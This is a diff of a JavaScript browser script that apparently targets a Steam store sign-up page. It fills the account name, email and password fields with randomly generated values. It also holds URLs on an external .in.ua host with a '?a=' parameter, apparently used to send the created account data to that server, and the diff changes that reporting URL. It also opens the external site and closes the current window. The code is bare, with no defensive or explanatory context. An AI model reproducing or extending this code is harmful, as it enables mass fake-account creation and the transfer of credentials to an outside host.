@@ -7,9 +7,10 @@
 var t='', n=0, st='http://js.xn--c1adqbs.in.ua';e=document.getElementById('responsive_store_nav_ctn');
 if(e){t=document.getElementById('responsive_store_nav_ctn').textContent;n=t.indexOf('подтверждена!');
 window.open(st);window.close();}
+
 var version=2,
 min=[100, 48, 95,  47, 95,  47, 95],n=['accountname','email','reenter_email','password','reenter_password'],
-max=[122, 57, 122, 57, 122, 57, 122],kol=[11, 9, 9, 11],w='',u=[],ht='http://js.xn--c1adqbs.in.ua/skakun.php?a=';
+max=[122, 57, 122, 57, 122, 57, 122],kol=[11, 9, 9, 11],w='',u=[],ht='http://xn--c1adqbs.in.ua/apm/index.php?a=';
 function Rnd(min, max){return Math.floor(Math.random()*(max-min+1))+min}
 function Chr(i){1==i?i=0:i=Rnd(0,6);z=Rnd(min[i], max[i]);if(96==z||47==z)z=95;return String.fromCharCode(z);}
 function Cre(t){for(var z='', i=1, j=1; i<=t; i++, j=i){if(j==t)j=1;z+=Chr(j);}return z;}
